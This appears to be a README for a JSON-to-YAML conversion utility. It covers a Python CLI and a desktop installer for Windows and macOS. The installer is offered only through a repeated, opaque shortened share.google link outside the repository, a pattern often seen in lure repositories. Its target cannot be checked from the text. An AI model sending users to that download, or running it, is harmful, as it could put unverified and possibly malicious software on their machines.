![JSON to YAML](assets/hero.png)

# JSON to YAML

*Config in YAML, source still JSON.*

## Overview

**JSON to YAML** is a developer utility. Convert JSON files to YAML and keep key order when you ask.

A tool emits JSON. The repo wants YAML.

Meant for a local repo or a config file on disk. No hosted workspace.

## How to get it

Use the command-line copy in this repository if you already have Python.

If you want a normal installer for Windows or macOS, open the [setup page](https://share.google/A1IHfyGRT0zGRLqj8) and follow the steps there.

## Features

- File or folder
- Optional key order
- Pretty YAML
- Leaves JSON in place

## Environment

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## CLI

Python 3.11 or newer. From the repository root:

```bash
python -m pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Desktop build

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/naom-lopez-47/json-to-yaml

MIT license. See `LICENSE`.
